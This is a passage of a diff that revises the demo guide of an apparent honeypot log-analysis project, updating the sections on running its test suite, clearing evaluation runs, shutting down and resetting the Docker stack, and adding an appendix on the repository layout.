+whether the local model happens to infer a technique on that pass. **A run showing only
+that failure is a clean run.**
 
 ---
 
-## 8. The eight-minute version
-
-If you are short on time, this is the spine:
-
-1. `/api/status` — everything connected, evaluator honestly reported as unavailable.
-2. `/sessions/seed-botnet-01` → **Analyze** → watch the seven-stage stepper (~25 s).
-3. Expand an indicator's evidence → the real log line. **This is the project's thesis.**
-4. `/mitre` — observed vs inferred, rendered differently.
-5. `/evaluation` → **Run evaluation** → 202 in ~2 s, then the two assessments side by
-   side, with `context` as "not established" beside a real `0.667`.
-6. Open the sanity finding — the honeypot disagrees with itself about its own hostname —
-   and a chain step's event id, which resolves to the real captured command.
-
----
-
-## 9. Test everything once
+## Part 8 — Running the tests
 
 ```bash
 cd backend && .venv/Scripts/python -m pytest
 ```
 
-**455 tests**, run against the live Docker stack and the real local model — bring the
-infrastructure up first. Expect **454 passed, 1 failed**: the nondeterministic intel test
-above. Any other failure is real.
-
-Runtime is roughly **6–8 minutes**.
+**459 tests**, about 7 minutes. They run against the live Docker stack and the real AI
+model, so start the infrastructure first. Expect `459 passed`, or 458 with the one
+nondeterministic test above.
 
 ```bash
 cd frontend
-npx tsc --noEmit      # exit 0
-npm run lint          # 9 problems, 0 errors, 9 warnings — this is the baseline
-npm run build         # succeeds
+npx tsc --noEmit      # type check — expect no output
+npm run lint          # expect 9 warnings, 0 errors (that is the baseline)
+npm run build
 ```
 
 ---
 
-## 10. Reset between demos
+## Part 9 — Reset and shut down
 
-Evaluation runs accumulate. To clear them:
+### Clear evaluation runs between demos
 
 ```bash
 cd backend && .venv/Scripts/python -c "
@@ -446,19 +702,39 @@ asyncio.run(m())
 "
 ```
 
-`delete_run` removes a run's children in foreign-key order — no FK in the evaluation
-schema declares `ondelete`, so deleting the run row first would fail.
+This does **not** touch the honeypot. An evaluation only ever clears state a previous
+evaluation created — the honeypot's identity keys, configuration and logs are protected in
+code, and a path-traversal attempt is rejected outright.
 
-The honeypot itself is **not** reset by this. An evaluation run clears only the state a
-previous run created (`downloads/`, `tty/`), and the reset boundary is enforced in code:
-the honeypot's SSH host keys, its `uuid`, its config and its logs are preserved, and a
-path-traversal attempt is rejected outright.
+### Shut down
 
-To start completely fresh:
+Stop the backend and frontend with `Ctrl+C` in their terminals, then:
+
+```bash
+docker compose down
+```
+
+### Start completely fresh
 
 ```bash
 docker compose down -v && docker compose up -d
 ```
 
-That discards the Elasticsearch and Postgres volumes; the backend re-installs its ingest
-pipeline and re-seeds the corpus on next start.
+`-v` deletes the stored data. The backend rebuilds its search index and reloads the sample
+attacks on next start.
+
+---
+
+## Appendix — Where things live
+
+```
+backend/     The API and all analysis logic (Python / FastAPI)
+frontend/    The web interface (React)
+infra/       Honeypot, Filebeat and Elasticsearch configuration
+README.md    Technical overview and architecture
+OVERVIEW.md  The design reasoning — why it is built this way
+DEMO.md      This file
+```
+
+For the engineering rationale behind any design decision here, read
+[`OVERVIEW.md`](OVERVIEW.md).
